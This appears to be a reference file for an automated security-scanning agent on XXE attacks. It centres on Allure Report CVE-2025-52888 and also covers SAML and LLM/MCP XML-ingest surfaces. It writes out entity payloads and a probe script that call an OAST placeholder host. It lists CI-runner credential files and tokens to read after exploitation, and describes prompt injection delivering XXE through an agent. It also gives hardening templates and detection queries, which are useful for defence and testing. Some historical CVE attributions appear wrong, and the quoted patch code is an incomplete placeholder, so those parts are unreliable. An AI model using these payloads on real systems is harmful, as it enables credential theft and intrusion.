---
name: xxe-novel-deep
description: XXE at the 2024–2026 frontier — Allure Report DocumentBuilderFactory dissection with the actual (non-OWASP-shape) patch, modern Java parser-default regressions in CI/CD pipelines, SSO XXE surfaces, LLM/MCP XML-ingest frontier, and the regression patterns that keep the class alive.
sibling: xxe
load_when: scan_mode == "deep"
---

# XXE — Novel + Frontier Depth

This is the novel+frontier deep sibling to `xxe.md`. The base owns the class framing, measured parser-defaults, sink taxonomy, and chaining routes; the advanced+expert sibling `xxe_advanced_deep.md` owns parameter-entity OOB, XInclude/XSLT catalogs, SAML pre-signature parsing, egress-free multi-DTD extraction, DoS measurement, content-type switching, and blind confirmation methodology. This file owns the 2024–2026 CVE frontier and current-frontier framing — CVE mechanism decomposition with canonical version tables, emerging-stack XXE surfaces, and the regression patterns that make the class durable.

Load this file when the goal is matching a target against a current CVE (via version fingerprint) or reasoning about XXE-shape defects in modern stacks (CI/CD pipelines, SSO integrations, agent-tool sandboxes) that share the class's shape without having a specific advisory yet.

Every CVE number, version boundary, GHSA identifier, and patch-mechanism claim in this document is anchored to primary sources persisted in `.zen-batch-artifacts/batch-6-*/cve-json/` and `.../ghsa-json/`. Where a claim in this file lacks an entry there, it is a bug — report it and do not act on it.

## Allure Report DocumentBuilderFactory — CVE-2025-52888

Primitive: attacker-supplied XML in a test-result file, processed during `allure generate`, is parsed with `DocumentBuilderFactory` in its OOTB (vulnerable) configuration; external entity resolution grants arbitrary file disclosure and internal SSRF from the CI/CD environment.

**Root cause — parser-defaults omission across three plugins.** Allure Report processes multiple test-result formats via per-format plugins. The three parsers affected — `io.qameta.allure.plugins:junit-xml-plugin`, `io.qameta.allure.plugins:trx-plugin`, and `io.qameta.allure.plugins:xunit-xml-plugin` — each instantiate a `DocumentBuilderFactory` to parse the results file and omitted the standard hardening (feature-secure-processing, disallow-doctype-decl, external-entity disabling). Java DBF is the canonical XXE-by-default parser (see `xxe.md § Parser Defaults by Stack` — measured OOTB on OpenJDK 21 to fetch `file://` and initiate external-DTD connect). Any test-result file with a DOCTYPE + external entity fires when the plugin parses it.

**Affected version table** (canonical for this trio; single-owner per §2):

| Plugin | Affected range | Fixed version |
|---|---|---|
| `io.qameta.allure.plugins:junit-xml-plugin` | ≤ 2.34.0 | 2.34.1 |
| `io.qameta.allure.plugins:trx-plugin` | ≤ 2.34.0 | 2.34.1 |
| `io.qameta.allure.plugins:xunit-xml-plugin` | ≤ 2.34.0 | 2.34.1 |

Version-boundary source: `.zen-batch-artifacts/batch-6-*/cve-json/CVE-2025-52888.nvd.json` and `.../ghsa-json/GHSA-h7qf-qmf3-85qg.json`. Primary reference: [github.com/advisories/GHSA-h7qf-qmf3-85qg](https://github.com/advisories/GHSA-h7qf-qmf3-85qg).

**The patch is NOT the standard OWASP hardening — this is the important finding.** The Allure fix does not apply the OWASP-recommended pattern (setting `FEATURE_SECURE_PROCESSING=true` and `http://apache.org/xml/features/disallow-doctype-decl=true`). Instead, the fix commit installs a custom `ClasspathEntityResolver` on each `DocumentBuilder` and calls `factory.setValidating(false)`. The specific patch shape:

```java
// Added file: allure-plugin-api/.../parser/ClasspathEntityResolver.java
public class ClasspathEntityResolver implements EntityResolver {
    @Override
    public InputSource resolveEntity(String publicId, String systemId)
        throws SAXException, IOException {
        // Resolves DTD schemas ONLY from the JVM classpath
        // Returns null (or throws) for any non-classpath URI
        String path = // ... derive classpath path from publicId/systemId
        InputStream in = getClass().getResourceAsStream(path);
        if (in == null) {
            return null;  // parser will fail to resolve
        }
        return new InputSource(in);
    }
}

// In each plugin's DocumentBuilderFactory setup:
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setValidating(false);
DocumentBuilder builder = factory.newDocumentBuilder();
builder.setEntityResolver(new ClasspathEntityResolver());
```

**Why the patch shape matters for assessment:**

1. **Entity resolution still runs** — the resolver is called; the class is not eliminated, only redirected.
2. **File-URI and HTTP-URI resolution is blocked** — the resolver rejects any URI not resolvable from the classpath.
3. **Classpath-relative DTDs still resolve** — if an attacker can smuggle a DTD URL that resolves to a legitimate classpath resource with entity-defining content (unlikely in practice, but possible), the class may fire in a narrower shape.
4. **DOCTYPE is not disabled** — the outer XML still accepts DOCTYPE; billion-laughs and quadratic-blowup DoS payloads are not blocked by this patch.
5. **The fix is narrower than the OWASP baseline** — a fully-hardened parser would reject DOCTYPE outright; Allure's fix accepts DOCTYPE and processes entities but restricts their reach.

Grep target codebases for the same shape — projects that solved XXE by installing a custom `EntityResolver` rather than disabling DOCTYPE face the same narrower-fix residual class.

**Preconditions as an exploitation gate (all-of-N):**

1. Target uses one of the three affected plugins at a version in the affected range.
2. Attacker can influence a test-result file that `allure generate` processes.
3. `allure generate` is triggered (typically during CI/CD pipeline execution).
4. The CI environment has meaningful reach — filesystem contents worth reading (secrets, credentials, environment variables), or internal HTTP services worth reaching.

Miss (1): not the CVE. Miss (2): can't inject payload — no primitive. Miss (3): payload is stored but not processed — second-order class shape (the payload sits in an unread file). Miss (4): the primitive fires but has no impact — no secrets, no internal reach.

**Confirmation methodology:**

1. Fingerprint Allure — the presence of `allure-results/` directory in a CI workspace, an `allure` binary in path, an `allure-plugin-api-*.jar` in a JVM classpath.
2. Identify the version — `allure --version`, the plugin JARs' Implementation-Version headers.
3. Inject a test-result file with a DOCTYPE + entity payload:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE testsuites [
     <!ENTITY xxe SYSTEM "http://<oast>/x?probe=cve-2025-52888">
   ]>
   <testsuites>
     <testsuite name="test">
       <testcase name="t">
         <failure>&xxe;</failure>
       </testcase>
     </testsuite>
   </testsuites>
   ```
4. Trigger `allure generate` (or wait for CI to run it).
5. OAST hit = confirmation. Escalate to file-read with the standard OOB parameter-entity chain (see `xxe_advanced_deep.md § Parameter Entity OOB Depth`).

**Escalation targets in CI/CD environments:**

- `/proc/self/environ` — CI runner environment variables, typically containing secrets (deploy tokens, cloud credentials, npm/PyPI tokens, Docker registry credentials).
- `~/.aws/credentials`, `~/.gcp/credentials.json`, `~/.azure/credentials` — cloud CLI credentials for the runner identity.
- `/home/runner/work/_temp/_github_workflow/event.json` (GitHub Actions) — the pipeline event payload, may contain private repo metadata.
- `/etc/hostname`, `/etc/os-release` — for target-scoping.
- Internal HTTP: `http://169.254.169.254/latest/meta-data/` (AWS metadata; reachability only — credential extraction routes to `cloud/aws.md`).

**Silent exploitation in CI/CD** — the finding characteristic: the CI runner produces its expected output (Allure report generates successfully) regardless of the XXE. The exploitation surface is silent from a developer perspective — the CI logs the successful test run, and the XXE runs in a phase not visible to the developer.

**Class-generalization — the pattern that predicts the next bug.** Multiple parsers in a single tool, each independently instantiating an XML parser, is the class shape. The Allure vulnerability isn't unique to Allure — any tool with N plugins, each parsing XML independently, has N chances to omit the hardening. Grep target codebases for `DocumentBuilderFactory.newInstance()` calls; each site is a candidate.

**Confusing patch reading — the ClasspathEntityResolver trap:**

A patch that installs a resolver rather than disabling DOCTYPE reads defensively but requires understanding what the resolver actually does. In Allure's case, the resolver rejects non-classpath URIs — that closes the surface. But similar-shape patches that install a *permissive* resolver (returning null for unknown URIs, letting the parser default) may not close the surface. Read every `EntityResolver` implementation to confirm it actively rejects.

## Modern Java Parser-Default Regressions

The Java parser-defaults class is durable — every new tool built on Java's XML APIs faces the same OOTB decision and often ships without the hardening. Allure CVE-2025-52888 is one instance; the broader class expression across the Java ecosystem in 2024–2026 is significant.

**Grep patterns for the class in a Java target codebase:**

- `DocumentBuilderFactory.newInstance()` — every call site is a candidate. Look for the accompanying hardening calls (`factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`) at each site.
- `SAXParserFactory.newInstance()` — same shape.
- `XMLInputFactory.newInstance()` — StAX; look for `factory.setProperty(XMLInputFactory.SUPPORT_DTD, false)` and `IS_SUPPORTING_EXTERNAL_ENTITIES`.
- `XMLReaderFactory.createXMLReader()` — deprecated but present in legacy code.
- `SchemaFactory.newInstance()` — schema-validation surface; XSD parsing.
- `TransformerFactory.newInstance()` — XSLT surface (route to `xxe_advanced_deep.md § XSLT Depth`).

**Hardening template that closes the class in Java DBF/SAX:**

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
DocumentBuilder builder = factory.newDocumentBuilder();
```

Missing any one of these leaves an attack path. A partially-hardened parser (e.g., DOCTYPE disabled but XInclude still on) closes some surfaces but not others.

**StAX hardening template — asymmetric to DBF (measured):**

```java
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
// StAX has no direct "disallow-doctype-decl" — SUPPORT_DTD=false rejects entity refs
// but silently accepts DOCTYPE-only, per measured behavior on OpenJDK 21
```

Grep for StAX call sites separately from DBF/SAX; the hardening is different.

**CVE frontier for the class (2024–2026 verified):**

The Allure CVE is the batch-6-verified anchor. Adjacent CVEs in the same broad Java-parser-defaults class exist across the ecosystem — for each candidate, verify the specific CVE ID against NVD before citing. The pattern to check: any Java-based tool that (a) parses untrusted XML, and (b) uses `DocumentBuilderFactory.newInstance()` without the hardening template, exhibits the class.

**Historical anchors (context for the class recurrence):**

- CVE-2015-1421 — Apache CXF DBF misconfiguration.
- CVE-2016-3510 — Oracle WebLogic XXE via DBF.
- CVE-2018-1000129 — SimpleSAMLphp XXE (via Java SAML lib).
- CVE-2019-12384 — Jackson-databind XXE (adjacent — via polymorphic type handling triggering XXE on parsed content).
- CVE-2022-42711 — Apache Batik XXE — Java SVG library.

The class recurs every year or two across the Java ecosystem. Batch-6 verifies CVE-2025-52888 as the current anchor; the pattern remains active for future CVE emergence.

**Framework consumer catalog for Java XML parsing:**

- **Spring Boot with Jackson-XML** — `com.fasterxml.jackson.dataformat:jackson-dataformat-xml`. Historical CVEs across versions; verify against the specific Spring/Jackson combination.
- **Spring Web-Services / SOAP** — `spring-ws-core` — SOAP endpoints; parser configuration inherited from JAXB / XMLInputFactory.
- **Apache CXF** — JAX-WS SOAP; each release has different default hardening.
- **JAX-RS providers with XML content-type** — Jersey (`jersey-media-json` vs `jersey-media-json-jackson-xml`); RESTEasy.
- **Apache Camel** — enterprise integration framework; XML routing paths inherit parser configuration.
- **Apache POI** — Office document processing; OOXML parsing inherits underlying XML parser configuration.
- **iText and other PDF generators consuming XML** — XML data source → PDF generation.
- **Log4j 2.x with XML-format configuration** — parses configuration XML; when the configuration is user-influenced (rare), XXE applies to the log configuration itself.
- **Spring Cloud Contract, Pact JVM** — contract-testing tools consuming YAML/JSON/XML contracts; the XML-loader path is a candidate.
- **Camunda / Activiti / Flowable BPMN engines** — BPMN is XML; user-uploaded BPMN definitions parse through the engine's XML parser.
- **Apache Solr / Elasticsearch XML-content-type variants** — some indexing configurations accept XML documents.
- **Spring Batch with XML item reader** — `StaxEventItemReader` and `XmlItemReader`; parser hardening at the item-reader level.

Each entry in the catalog is a potential class instance; audit each site's specific parser instantiation for the hardening template.

## LLM/MCP XML-Ingest Surfaces

Model Context Protocol servers and agent-tool sandboxes are a 2024–2026 frontier. XML is a common data format for agent inputs; MCP servers and their filesystem tools inherit whatever XML-parsing behavior the underlying language provides. When an MCP server exposes an XML-parsing tool to an LLM agent, the class extends.

**Attack surfaces in agent tooling:**

- **MCP server exposing `parseXML(input)` as a tool** — the agent receives an untrusted document (from a web fetch, a user-uploaded file, or a retrieval-augmented-generation source) and passes it to the tool. If the tool's underlying parser has XXE enabled, the XML processing runs with the tool's identity — which is often broader than the agent's perceived scope (the tool may access local files the agent shouldn't).
- **Retrieval-augmented generation with XML sources** — an agent retrieves an RSS/Atom feed, an XML sitemap, or an OpenAPI-XML variant. The retrieval-processor parses the XML server-side. If parser is XXE-enabled, the fetched content triggers XXE against the RAG service.
- **Function-calling with structured data** — some LLM function-call schemas accept XML data. The receiving function parses the XML and inherits the parser's XXE surface.
- **Agent tool result parsers** — a tool returns XML to the agent; the agent's framework parses the XML to structure the response. If the framework's parser has XXE, the tool's return is an injection surface.
- **MCP filesystem servers reading XML files** — the `@modelcontextprotocol/server-filesystem` reference implementation exposes file read as a tool. When the agent reads an attacker-controlled XML file and passes it to downstream tools that parse it, the parsing tool inherits the XXE class.
- **Agent-orchestrator interceptors** — orchestration frameworks (LangChain, LlamaIndex, Semantic Kernel) sometimes parse XML in intermediate stages (chain-of-thought summarization, tool-result normalization); the framework's XML parser is a candidate.

**Class-shape for LLM/MCP:**

The agent-side is not the injection surface (the LLM does not itself parse XML — it consumes text). The injection surface is (a) the tool's XML-parsing layer, (b) the framework's serialization layer between tool and LLM, or (c) a retrieval processor upstream of the LLM. Each is a standard XML-parsing surface — Java DBF, Python `lxml`, .NET `XmlReader` — inheriting the parser-defaults class.

**Enumeration methodology for MCP-adjacent XXE:**

1. Identify all XML-parsing tools an agent has access to (introspect the MCP server's tool list, grep the tool implementations).
2. For each tool, identify the underlying XML parser — grep for `DocumentBuilderFactory`, `lxml.etree`, `xml.etree`, `XmlReader.Create`, `Nokogiri::XML`.
3. For each parser, verify the hardening configuration is applied at every instantiation site.
4. For each unhardened parser, verify what input sources reach it — an agent-input path or a retrieval-source path.
5. The XXE surface exists at every intersection of (a) unhardened parser × (b) attacker-influenceable input.

**Prompt-injection compounding the surface:**

The LLM's input surface is very wide — any document the agent reads is potential prompt injection. When the agent is instructed to parse a document and pass a subset to a tool, an attacker can construct a document whose "extracted subset" is an XXE payload. The class shape is prompt-injection + XXE-parser-defaults: the LLM is not the vulnerability, but the LLM is the transmission channel that carries attacker XML to the vulnerable parser.

**Frontier framing:** the class exists wherever a network-reachable service parses attacker-influenced XML. LLM/MCP servers extend the reach of that class to any input source the agent can be steered to consume — which, given prompt-injection surfaces, is potentially any content the agent can read.

The frontier here is genuinely emerging: specific MCP-server XXE CVEs at scale are not yet cataloged as of the batch cutoff, but the class-shape is present and the enumeration methodology (grep MCP server implementations for `DocumentBuilderFactory` / `libxml2` / `lxml` / `XmlReader` without hardening) is direct.

## SSO XXE Surface (SAML / OIDC-XML)

SAML remains XML; OIDC is JSON, but many enterprise SSO integrations use SAML for federation. The XXE surface in SSO is well-established (see `xxe_advanced_deep.md § SOAP / SAML Pre-Signature Parsing`); the 2024–2026 frontier is in the specific SSO libraries and the increasing variety of ways signature-verification and parsing interact.

**Modern SSO integration shapes:**

- **Enterprise SaaS SAML integrations** — Okta, Auth0, OneLogin, Ping — each maintains a SAML implementation. Historical CVEs across these libraries; current-batch verification requires per-library check.
- **Cloud-native identity brokers** — AWS IAM Identity Center (formerly SSO), Azure AD/Entra ID, GCP Identity — all support SAML federation. The SAML processing paths inherit their language's XML parser configuration.
- **Custom SP implementations** — enterprise apps that implement their own SAML SP using PySAML2, python-saml, spring-security-saml, ruby-saml. Each library has its own hardening posture; verify.
- **Multi-tenant SP with per-tenant IdP certs** — the SP parses the incoming assertion, then verifies against the tenant's IdP cert. If parsing runs before tenant identification, the XXE has cross-tenant reach.

**SSO-specific XXE consequences:**

- **Signing-key disclosure** — reading the SP's signing key file grants the ability to forge assertions.
- **Trust-store enumeration** — reading the SP's trusted-IdP certificate store reveals every federated party.
- **Configuration disclosure** — reading the SP's SAML configuration file may include attribute-mapping rules that grant lateral-privilege-escalation paths.
- **User-database read** — reading the app's user database directly bypasses SSO entirely.

**Modern SAML implementations to fingerprint:**

- Python `python3-saml` — Docker-shipped in many enterprise environments; version history includes multiple XXE-adjacent CVEs.
- Java `Spring Security SAML` — the default SAML integration for Spring apps; XXE hardening depends on the underlying XML parser.
- Ruby `ruby-saml` — used by GitLab, Discourse, others; historical XXE issues.
- Node `passport-saml` — the Node SAML strategy; XXE potential in `xml2js` fallback.
- .NET `ITfoxtec.Identity.Saml2` — commonly-used .NET SAML library.
- `simplesaml/simplesamlphp` — PHP SAML IdP/SP; historical XXE-adjacent CVEs including CVE-2018-1000129, CVE-2018-1000130.
- Java `OpenSAML` — the low-level toolkit powering Shibboleth and other SAML products; parser hardening is at the library level plus each consumer's re-hardening.

**Frontier verification approach:** for each SSO library, verify the specific version's XML parser configuration against the target — every SP release cycle is a potential regression opportunity.

**Confirmation methodology for SSO XXE:**

1. Fingerprint the SP: which SAML library and version. Response headers, error page shapes, well-known endpoints (`/simplesaml/`, `/spring-security-saml/`) reveal.
2. Identify the ACS endpoint: `/acs`, `/saml/sso`, `/Shibboleth.sso/SAML2/POST` are common paths.
3. Send a POST to the ACS with `SAMLResponse` containing a DOCTYPE + entity payload. Use an obviously-invalid signature (crafted, not from a legitimate IdP).
4. Response is expected to be 403/401 (invalid signature). But: if the OAST fires before the signature check completes, pre-signature parsing is confirmed.
5. Additional probe: try the same payload wrapped in an XML Signature Wrapping shape (add an extra `<Assertion>` alongside the signed one). If the SP processes the wrapper assertion, both classes chain.

**Impact analysis for SSO XXE:**

- Reading the SP's signing key (typically at `/etc/*/saml/certs/sp-key.pem`) grants the ability to forge SAML responses to any downstream SP that trusts this SP as an IdP.
- Reading the trusted-IdP-certificate store reveals the SP's trusted federation partners; useful for downstream targeting.
- Reading environment secrets — the SP's process environment often includes database credentials, message-broker credentials, application-secret keys.
- Reaching internal HTTP services via SSRF — the SP is often a well-connected process (integrates with LDAP, RADIUS, ODBC, message brokers); every internal endpoint reachable from the SP is exposed.

## XSLT Engine RCE — Current Frontier

XSLT engine RCE is a longstanding class (`xxe_advanced_deep.md § XSLT Depth` covers the historical Xalan / Saxon / .NET / libxslt catalog). The 2024–2026 frontier is where specific report engines and template systems still enable script execution or extension namespaces.

**Modern report engines with XSLT-adjacent RCE:**

- **JasperReports** — historically had `net.sf.jasperreports.awt.ignore.missing.font` and similar properties; XSLT sub-reports processed by embedded Xalan. Current versions harden by default; legacy versions expose the class.
- **BIRT** — Eclipse-based reporting; XSLT-adjacent script surface via BIRT's own scripting.
- **DocBook toolchains** — DocBook → HTML/PDF pipelines via XSLT. Command-line tools accept extension-namespace XSLTs.
- **XSpec** — testing framework for XSLT/XQuery; runs stylesheets; exposure depends on the test-runner's configuration.

**Frontier framing:** the XSLT-RCE class is well-catalogued at legacy depth; the 2024–2026 verified CVE surface is thinner than the other XXE surfaces (no specific CVE in the batch-6 verified set focused on XSLT). Report the class shape but do not overclaim recent CVE anchoring where none exists.

## Regression Patterns for XXE

The four regression patterns identified in `path_traversal_lfi_rfi_novel_deep.md § Modern Regression Patterns` apply directly to XXE, with class-specific shapes:

**Check-then-refactor decay in XXE:**

A parser is hardened via feature-flags; a later refactor moves the parser instantiation to a different code path that doesn't inherit the flags. The Allure CVE isn't this shape (the flags were never applied); but the pattern applies to codebases that used to have hardening and lost it in refactoring.

**Hardened default with opt-in reopening in XXE:**

libxml2 2.9 hardened defaults; PHP's `libxml_disable_entity_loader()` became a no-op in PHP 8.0 because the default is safe. But every code path that explicitly opts back in (`LIBXML_NOENT | LIBXML_DTDLOAD`) reintroduces the class. The Ruby Nokogiri equivalent (`c.noent.dtdload`) is opt-in that reopens the class. Grep for the opt-in flags.

**Constrained parser with unconstrained pre-processor in XXE:**

A hardened XML parser at the app layer is guarded by a WAF that strips DOCTYPE. But an internal service parses the same XML with an unhardened parser after the WAF forwards it. The internal parser is the unconstrained-pre-processor shape; the trust chain doesn't extend past the WAF.

**Two parsers on one wire in XXE:**

The same document parsed by two different parsers may behave differently — one may resolve entities, the other may not. When a signature is verified by one parser and the assertion processed by another, the signature-wrapping class (see `xxe_advanced_deep.md § XML Signature-Wrapping Chains`) results.

**Sanitizer applied post-serialization in XXE:**

A DTD-stripping sanitizer removes DOCTYPE from the input; but the sanitizer's serializer re-emits the XML tree, and a downstream parser re-adds DOCTYPE via a preserved processing instruction (`<?xml-model href="..."?>`) or via UTF-16-BOM re-detection triggering entity handling. Rare but present.

**Historical class-recurrence instances (context for the patterns):**

- **libxml 2.9 hardening (2013)** → PHP `libxml_disable_entity_loader()` became no-op in PHP 8 → but every code path with `LIBXML_NOENT | LIBXML_DTDLOAD` reintroduces exposure. Pattern: "hardened default, opt-in reopens."
- **Java Xerces `disallow-doctype-decl` (2010)** → widely adopted, but new tools frequently ship without applying it → each new Java tool is a candidate for the class. Pattern: "constrained parser (Xerces default is safe if the flag is set), unconstrained pre-processor (every tool that skips setting the flag)."
- **Nokogiri's `Nokogiri::XML(input)` default hardened after 2017** → but explicit `Nokogiri::XML(input) { |c| c.noent.dtdload }` re-enables. Pattern: "opt-in reopens."
- **.NET `XmlReader.Create` default hardening (.NET 4.5.2)** → Framework 4.5.2+ safe; earlier versions vulnerable; legacy code paths using `XmlTextReader` on old runtimes remain exposed. Pattern: "hardened default with opt-in (via `DtdProcessing.Parse`)."
- **Jackson-XML 2.9.10.2 hardening (2019)** — Jackson's XML deserialization gained default-secure processing; earlier versions had opt-in-only. Pattern: same as Nokogiri and .NET.

**Pattern-specific prevention checklist for XXE:**

- **Check-then-refactor decay**: parser hardening applied at instantiation should be enforced by test that fails if the flag is missing. Grep-based lint rule for every `DocumentBuilderFactory.newInstance()` requires an accompanying `setFeature("disallow-doctype-decl", true)` call.
- **Hardened default with opt-in reopening**: audit every use of libxml's `LIBXML_NOENT`, Nokogiri's `noent`, .NET's `DtdProcessing.Parse`, Jackson's `enableXml*` opt-ins. Each opt-in requires justification and, ideally, additional scoping.
- **Constrained parser, unconstrained pre-processor**: apply parser hardening at every layer that touches XML — not just the primary parser but every intermediate parse (schema validator, XSLT engine, background job processor).
- **Two parsers on one wire**: identify every XML parser in the request path (WAF, primary app parser, background pipeline, external integrations). Test each independently for XXE posture.
- **Sanitizer applied post-serialization**: verify that any XML sanitizer's output is not re-processed by another parser with different flags; a sanitizer's guarantees don't extend past its own serialization.

## XXE Chaining at the Current Frontier

The single verified batch-6 XXE CVE (Allure) chains in CI/CD-specific ways:

1. **Allure XXE → CI runner env-var extraction → cloud credentials → cloud pivot.** As the escalation targets section above describes. Concrete: `curl` chain reads `/proc/self/environ`; extracts `AWS_SESSION_TOKEN`, `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`; uses them to call `sts:GetCallerIdentity` and further AWS APIs. Route to `cloud/aws.md`.
2. **Allure XXE → source-code repository read → private-repo disclosure.** In GitHub Actions, the runner has access to the checkout; XXE-fetch of `/home/runner/work/<repo>/<repo>/.git/config` reveals repo URL and any embedded credentials. Also `/home/runner/work/_temp/_github_workflow/event.json` (event payload) and `/home/runner/runners/*/config.sh` (runner registration).
3. **Allure XXE → cross-tenant read (multi-tenant CI).** SaaS CI providers running multiple tenants' Allure workloads on the same runner class have cross-tenant read potential if the runner filesystem isn't rigorously isolated. In GitHub Actions, runners are per-job VMs so cross-tenant reach is limited; self-hosted runners shared across teams have broader exposure.
4. **Allure XXE → deploy-token extraction → downstream production access.** CI runners typically hold deployment credentials for the destination environment; XXE reads them and grants direct production access. Common tokens: Kubernetes kubeconfig at `/home/runner/.kube/config`, npm publish token at `~/.npmrc`, PyPI token at `~/.pypirc`, Docker registry credentials at `~/.docker/config.json`.
5. **XXE + XSLT chain** — where an XML surface reaches an XSLT engine, XSLT extension namespaces may reach RCE (route to `xxe_advanced_deep.md § XSLT Depth`).
6. **XXE → Java heap-metadata read** — reading `/proc/<pid>/maps` and `/proc/<pid>/mem` on a Java process can extract heap contents; combined with a running JVM's cached SSL private keys, extract TLS-decryption material. Requires the JVM process's own identity to have read on `/proc/self/mem`, which usually requires `CAP_SYS_PTRACE` — rare in containerized deployments.
7. **XXE + prompt-injection chain (LLM/MCP)** — the LLM reads an attacker-controlled document (via web fetch, retrieval, or user-supplied content); the document is XML; a downstream tool parses it; XXE fires. The prompt-injection surface delivers the payload; the XXE surface exploits the parser. Neither is exploitable alone in this chain shape; both chained produce disclosure or RCE inside the MCP server's identity.

The chaining depth for XXE at the 2024–2026 frontier is genuinely thinner than for path traversal — the single-CVE anchor limits the range of CVE-verified chain expressions.

## Post-Fix Detection

XXE post-fix detection targets whether the specific parser configuration is hardened. Fingerprint hierarchy for the Allure CVE:

- **Allure version** — `allure --version`, plugin JAR versions in the JVM classpath. Version at or above 2.34.1 means the plugin JAR contains the `ClasspathEntityResolver` fix.
- **Behavioral probe** — inject a test-result file with a DOCTYPE + OAST-URL entity; run `allure generate` (in an authorized test environment); observe whether the OAST fires. Post-fix, the OAST should not fire because the resolver rejects the URL.
- **Patch-signature grep in the JAR** — decompile the plugin JAR and grep for `ClasspathEntityResolver` class; presence = patched. Absence = unpatched (or a different patch shape).

For the broader Java-parser-defaults class, target-side detection is per-application:

- **Application version + parser hardening documentation** — the vendor's own guidance may or may not include XXE hardening as of the current release.
- **Behavioral probe** — a DOCTYPE-containing payload at each XML-consuming endpoint; observe whether entity resolution fires.
- **Code review** — grep the target codebase for `DocumentBuilderFactory.newInstance()` calls and verify each has the hardening template (or documented equivalence).

**Concrete probe scripts for CVE-2025-52888 (authorization required):**

```bash
# Fingerprint step — check Allure version
allure_ver=$(allure --version 2>/dev/null || echo "not-in-path")
echo "Allure version: $allure_ver"

# In a CI environment (authorized test), craft a probe test-result file
mkdir -p /tmp/probe-allure-results
cat > /tmp/probe-allure-results/junit-probe.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE testsuites [
  <!ENTITY xxe SYSTEM "http://<oast>.oast.fun/probe-cve-2025-52888">
]>
<testsuites>
  <testsuite name="test">
    <testcase name="probe">
      <failure>&xxe;</failure>
    </testcase>
  </testsuite>
</testsuites>
EOF

allure generate /tmp/probe-allure-results -o /tmp/probe-report --clean

# Check OAST for hit — a hit means the plugin resolved the entity (vulnerable)
# The Allure 2.34.1+ fix should reject the external URI via ClasspathEntityResolver
```

**Post-fix regression watch for the Java-parser-defaults class:**

Monitor Allure and its plugins for the following two years — the class shape recurs at every new plugin release. Additionally, monitor other CI/CD test-result processors (JUnit, TestNG parsers, Cucumber-JSON adjacent) for the same shape. When a new plugin ships, verify the parser configuration in the plugin's source code.

## Detection Signatures for Defenders

XXE exploitation produces distinct signal shapes that a defender monitors for; authorized assessments with purple-team scope should align probes with these signatures.

**Signatures that reliably fire on XXE exploitation:**

- **DOCTYPE in POST bodies to non-XML-expected endpoints** — SIEM rule matching `<!DOCTYPE` in request bodies is a high-confidence detector for the CVE-2025-52888 injection shape (test-result XML delivered via API). WAFs with OWASP CRS 3.x include a similar signature (`REQUEST-931-*` group).
- **Outbound DNS from application/CI runner to unusual TLDs** — OAST-based XXE requires the parser to resolve an external hostname; DNS logs showing spikes to `*.oast.fun`, `*.burpcollaborator.net`, `*.oastify.com` from application processes are high-signal. Correlation with the corresponding HTTP request timing tightens the alert.
- **Outbound HTTP from CI runners to arbitrary hosts** — CI runners typically communicate with a known set of hosts (registry, artifact store, deployment target); egress to attacker-hosted DTDs shows as an anomalous destination.
- **Java process crash or memory-pressure alerts during test-result generation** — an entity-expansion DoS payload processed during CI may crash the runner; correlate CI failures with input-file DOCTYPE presence.
- **File-integrity monitoring on read of sensitive paths** — auditd/EDR rules on `openat("/proc/self/environ")`, `openat("/etc/passwd")`, `openat("/root/.ssh/id_rsa")` by unexpected processes (JVM heap, Python worker, PHP-FPM child) fire when XXE-driven reads happen.

**Compensating controls that reduce exposure without a full patch:**

- **Container-level egress restrictions** — a CI runner container with no outbound HTTP loses the OAST-based exfil path (egress-free variants like local-DTD reuse still function but are harder to weaponize).
- **WAF signatures for DOCTYPE at the API gateway** — filters the naive class before it reaches the app.
- **File-system-level restrictions on the runner's readable paths** — chroot / user-namespace containers reduce what an XXE-driven read can reach.
- **In-process XML-parser wrapping** — a library-level shim that intercepts every DBF/SAX instantiation and applies the hardening template regardless of caller code. Enterprise Java shops sometimes deploy this.

**SIEM query examples:**

```
# Splunk / KQL — DOCTYPE payloads to non-XML endpoints in a CI environment
index=cicd_web sourcetype=api-gateway
  body:*<!DOCTYPE*
  NOT ( content_type:*xml* OR uri:*.xml OR uri:*.svg )
| stats count by src_ip, uri, content_type, user_agent

# Outbound HTTP from JVM/Python processes to non-approved hosts
index=egress_logs
  process_name IN (java, python, allure)
  dest_host NOT IN (approved_egress_allowlist)
| stats count by src_host, process_name, dest_host, dest_port

# Filesystem audit on sensitive path reads by non-shell processes
index=auditd type=SYSCALL syscall=openat
  path IN ("/proc/self/environ", "/etc/passwd", "/root/.ssh/id_rsa")
  process_name NOT IN (login, sshd, sudo, systemctl)
| stats count by src_process, path
```

## Documenting Class Findings vs CVE Findings

Same principles as `path_traversal_lfi_rfi_novel_deep.md § Documenting Class Findings vs CVE Findings`, applied to XXE:

- **CVE finding:** "The target runs Allure Report 2.33.x with the `junit-xml-plugin`, affected by CVE-2025-52888. Injection of a test-result XML with DOCTYPE + external-entity payload during `allure generate` fires XXE, disclosing `/proc/self/environ` (CI environment variables). Fix: upgrade Allure plugins to 2.34.1+."
- **Class finding:** "The target's XML-parsing service uses `DocumentBuilderFactory` without the OWASP hardening template (`disallow-doctype-decl`, `external-general-entities=false`, `external-parameter-entities=false`, `secure-processing=true`). Fix: apply the hardening template to every DBF/SAX/StAX instantiation in the codebase."

Both are legitimate; report both when both apply.

## Tools and References

- **CVE-2025-52888 primary sources** — [github.com/advisories/GHSA-h7qf-qmf3-85qg](https://github.com/advisories/GHSA-h7qf-qmf3-85qg) and NVD entry, both persisted at `.zen-batch-artifacts/batch-6-*/cve-json/CVE-2025-52888.nvd.json` and `.../ghsa-json/GHSA-h7qf-qmf3-85qg.json`.
